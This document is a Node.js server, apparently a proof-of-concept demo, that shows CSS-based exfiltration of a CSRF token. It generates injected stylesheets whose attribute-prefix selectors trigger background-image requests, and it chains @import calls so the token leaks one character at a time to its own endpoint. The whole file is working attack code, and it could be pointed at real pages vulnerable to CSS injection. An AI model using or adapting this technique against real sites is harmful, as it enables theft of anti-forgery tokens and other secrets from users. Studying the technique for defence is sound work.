const { createServer } = require('http');
const { readFileSync } = require('fs');

const PORT = 3030;
const BASE64_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

const indexPage = readFileSync('./exfil.html', 'utf8');
const stylesheet = readFileSync('./exfil.css', 'utf8');
const getCSRF = () => Buffer.from(Uint8Array.from({ length: 4 }, () => Math.floor(Math.random() * 256))).toString('base64');

const sendResponse = (res, content, type = 'text/css', status = 200) => {
  res.writeHead(status, {
    'Content-Type': type,
    'Content-Length': content.length
  });
  res.end(content);
};

const getCSSRule = (token, isPartial = true) => `input[name="csrf"][value${isPartial ? '^' : ''}="${token}"] ~ * {
  background-image: url("./exfil.gif?${token}${isPartial ? '' : '.'}");
}`;

const generateInjectedStylesheet = (prefix = '') => {
  let css = `@import url(./injected.css?${prefix.length + 1});\nh1 { color: ${prefix.length.toString(16).repeat(3)}; }\n`;
  if (prefix) {
    css += getCSSRule(prefix, false) + '\n';
  }
  css += Array.from(BASE64_CHARS, char => getCSSRule(char)).join('\n');
  return css;
};

let finalToken;

const resolvers = {};

const waitForMatch = length => new Promise(resolve => resolvers[length] = resolve);

const resolveTokenSlice = token => resolvers[token.length]?.(token);

const server = createServer((req, res) => {
  switch (req.url) {
    case '/': {
      const csrf = getCSRF();
      const page = indexPage.replace('{{ csrf }}', csrf);
      console.log(`Sending index (CSRF token = ${csrf})`);
      sendResponse(res, page, 'text/html');
      break;
    }
    case '/exfil.css': {
      sendResponse(res, stylesheet);
      break;
    }
    case '/exfil.json': {
      (finalToken
        ? Promise.resolve(finalToken)
        : new Promise(resolve => resolvers.final = resolve)
      ).then(token => {
        sendResponse(res, JSON.stringify({ token }), 'application/json');
      });
      break;
    }
    case '/injected.css': {
      sendResponse(res, generateInjectedStylesheet());
      break;
    }
    case '/favicon.ico': {
      sendResponse(res, '<svg viewBox="0 0 1 1"></svg>', 'image/svg+xml');
      break;
    }
    default: {
      let match = req.url.match(/^\/injected\.css\?(\d+)$/);
      if (match) {
        waitForMatch(match[1]).then(token => {
          sendResponse(res, generateInjectedStylesheet(token));
        });
        break;
      }
      match = req.url.match(/^\/exfil\.gif\?([A-Za-z\d+\/]+)$/)
      if (match) {
        const isPartial = !match[1].endsWith('.');
        if (isPartial) resolveTokenSlice(match[1]);
        else {
          finalToken = match[1].slice(0, -1);
          resolvers.final?.(finalToken);
        }
        console.log(`Got ${isPartial ? 'partial' : 'complete'} token: ${match[1]}`);
      }
      sendResponse(res, 'You\'re not supposed to get this...', 'text/plain', 404);
    }
  }
});

server.listen(PORT, () => {
  console.log(`CSS Exfiltration test - listening to port ${PORT}`)
});
